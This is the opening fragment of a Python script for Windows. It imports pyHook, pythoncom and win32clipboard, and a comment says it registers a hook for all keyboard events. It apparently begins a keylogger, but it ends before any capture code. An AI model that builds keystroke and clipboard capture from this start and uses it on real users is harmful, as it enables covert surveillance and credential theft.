#!/usr/bin/env python3


import io
import ctypes
import os
import pythoncom
import pyHook
import sys
import time
import win32clipboard

# We register a hook for all keyboard events
